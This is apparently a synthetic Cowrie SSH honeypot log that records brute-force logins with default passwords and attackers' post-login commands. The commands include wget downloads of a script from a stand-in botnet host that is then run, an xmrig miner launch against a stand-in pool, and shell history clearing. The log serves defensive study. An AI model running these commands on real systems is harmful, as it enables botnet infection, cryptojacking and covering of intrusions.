+{"timestamp": "2026-11-07T14:30:00.000000Z", "src_ip": "198.51.100.48", "session": "5a7e4dbc", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "ec7378c1a92f5a8dde7e8b7a1ddf33d1"}
+{"timestamp": "2026-11-07T14:30:04.000000Z", "src_ip": "198.51.100.48", "session": "5a7e4dbc", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "oracle", "password": "admin"}
+{"timestamp": "2026-11-07T14:30:07.000000Z", "src_ip": "198.51.100.48", "session": "5a7e4dbc", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "postgres", "password": "123456"}
+{"timestamp": "2026-11-07T14:31:32.000000Z", "src_ip": "198.51.100.48", "session": "5a7e4dbc", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 33.6}
+{"timestamp": "2026-11-07T14:56:00.000000Z", "src_ip": "198.51.100.39", "session": "cc15a3ad", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 53165, "dst_ip": "192.0.2.20", "dst_port": 22, "protocol": "ssh"}
+{"timestamp": "2026-11-07T14:56:00.000000Z", "src_ip": "198.51.100.39", "session": "cc15a3ad", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-OpenSSH_8.9p1"}
+{"timestamp": "2026-11-07T14:56:00.000000Z", "src_ip": "198.51.100.39", "session": "cc15a3ad", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "0a07365cc01fa9fc82608ba4019af499"}
+{"timestamp": "2026-11-07T14:56:03.000000Z", "src_ip": "198.51.100.39", "session": "cc15a3ad", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "oracle", "password": "ubuntu"}
+{"timestamp": "2026-11-07T14:56:05.000000Z", "src_ip": "198.51.100.39", "session": "cc15a3ad", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "pi", "password": "1qaz2wsx"}
+{"timestamp": "2026-11-07T14:56:08.000000Z", "src_ip": "198.51.100.39", "session": "cc15a3ad", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "user", "password": "admin"}
+{"timestamp": "2026-11-07T14:56:10.000000Z", "src_ip": "198.51.100.39", "session": "cc15a3ad", "sensor": "ssh-in", "eventid": "cowrie.login.success", "username": "postgres", "password": "password"}
+{"timestamp": "2026-11-07T14:56:24.000000Z", "src_ip": "198.51.100.39", "session": "cc15a3ad", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "nohup ./xmrig -o stratum+tcp://pool.miner-sample.invalid:3333 --donate-level 1 &"}
+{"timestamp": "2026-11-07T14:56:35.000000Z", "src_ip": "198.51.100.39", "session": "cc15a3ad", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "whoami"}
+{"timestamp": "2026-11-07T14:58:06.000000Z", "src_ip": "198.51.100.39", "session": "cc15a3ad", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 49.4}
+{"timestamp": "2026-11-07T19:15:00.000000Z", "src_ip": "198.51.100.10", "session": "1163fd17", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 39958, "dst_ip": "192.0.2.20", "dst_port": 2222, "protocol": "ssh"}
+{"timestamp": "2026-11-07T19:15:00.000000Z", "src_ip": "198.51.100.10", "session": "1163fd17", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-Go"}
+{"timestamp": "2026-11-07T19:15:00.000000Z", "src_ip": "198.51.100.10", "session": "1163fd17", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "0a07365cc01fa9fc82608ba4019af499"}
+{"timestamp": "2026-11-07T19:15:05.000000Z", "src_ip": "198.51.100.10", "session": "1163fd17", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "root", "password": "password"}
+{"timestamp": "2026-11-07T19:15:07.000000Z", "src_ip": "198.51.100.10", "session": "1163fd17", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "postgres", "password": "password"}
+{"timestamp": "2026-11-07T19:16:34.000000Z", "src_ip": "198.51.100.10", "session": "1163fd17", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 116.4}
+{"timestamp": "2026-11-07T19:49:00.000000Z", "src_ip": "203.0.113.136", "session": "647f1d43", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 35186, "dst_ip": "192.0.2.20", "dst_port": 2222, "protocol": "ssh"}
+{"timestamp": "2026-11-07T19:49:00.000000Z", "src_ip": "203.0.113.136", "session": "647f1d43", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-OpenSSH_8.9p1"}
+{"timestamp": "2026-11-07T19:49:00.000000Z", "src_ip": "203.0.113.136", "session": "647f1d43", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "ec7378c1a92f5a8dde7e8b7a1ddf33d1"}
+{"timestamp": "2026-11-07T19:49:02.000000Z", "src_ip": "203.0.113.136", "session": "647f1d43", "sensor": "ssh-in", "eventid": "cowrie.login.success", "username": "support", "password": "ubuntu"}
+{"timestamp": "2026-11-07T19:49:07.000000Z", "src_ip": "203.0.113.136", "session": "647f1d43", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "pkill -9 xmrig"}
+{"timestamp": "2026-11-07T19:49:26.000000Z", "src_ip": "203.0.113.136", "session": "647f1d43", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "cd /tmp; wget http://dl.botnet-sample.invalid/x86.sh; chmod +x x86.sh; ./x86.sh"}
+{"timestamp": "2026-11-07T19:49:26.000000Z", "src_ip": "203.0.113.136", "session": "647f1d43", "sensor": "ssh-in", "eventid": "cowrie.session.file_download", "url": "http://dl.botnet-sample.invalid/x86.sh", "shasum": "5f1c3f0a0b9d6e2c4a8b7e6d5c4b3a291817161514131211100f0e0d0c0b0a09", "outfile": "var/lib/cowrie/downloads/x"}
+{"timestamp": "2026-11-07T19:49:46.000000Z", "src_ip": "203.0.113.136", "session": "647f1d43", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "curl -s ipinfo.io"}
+{"timestamp": "2026-11-07T19:49:56.000000Z", "src_ip": "203.0.113.136", "session": "647f1d43", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 26.9}
+{"timestamp": "2026-11-07T21:11:00.000000Z", "src_ip": "198.51.100.13", "session": "23a9140a", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 34752, "dst_ip": "192.0.2.20", "dst_port": 22, "protocol": "ssh"}
+{"timestamp": "2026-11-07T21:11:00.000000Z", "src_ip": "198.51.100.13", "session": "23a9140a", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-libssh_0.9.6"}
+{"timestamp": "2026-11-07T21:11:00.000000Z", "src_ip": "198.51.100.13", "session": "23a9140a", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "ec7378c1a92f5a8dde7e8b7a1ddf33d1"}
+{"timestamp": "2026-11-07T21:11:03.000000Z", "src_ip": "198.51.100.13", "session": "23a9140a", "sensor": "ssh-in", "eventid": "cowrie.login.success", "username": "ubuntu", "password": "root"}
+{"timestamp": "2026-11-07T21:11:05.000000Z", "src_ip": "198.51.100.13", "session": "23a9140a", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "nohup ./xmrig -o stratum+tcp://pool.miner-sample.invalid:3333 --donate-level 1 &"}
+{"timestamp": "2026-11-07T21:11:15.000000Z", "src_ip": "198.51.100.13", "session": "23a9140a", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "cat /proc/cpuinfo | grep name | wc -l"}
+{"timestamp": "2026-11-07T21:11:30.000000Z", "src_ip": "198.51.100.13", "session": "23a9140a", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "history -c; unset HISTFILE"}
+{"timestamp": "2026-11-07T21:11:35.000000Z", "src_ip": "198.51.100.13", "session": "23a9140a", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "cd /tmp; wget http://dl.botnet-sample.invalid/x86.sh; chmod +x x86.sh; ./x86.sh"}
+{"timestamp": "2026-11-07T21:11:35.000000Z", "src_ip": "198.51.100.13", "session": "23a9140a", "sensor": "ssh-in", "eventid": "cowrie.session.file_download", "url": "http://dl.botnet-sample.invalid/x86.sh", "shasum": "5f1c3f0a0b9d6e2c4a8b7e6d5c4b3a291817161514131211100f0e0d0c0b0a09", "outfile": "var/lib/cowrie/downloads/x"}
+{"timestamp": "2026-11-07T21:13:27.000000Z", "src_ip": "198.51.100.13", "session": "23a9140a", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 24.6}
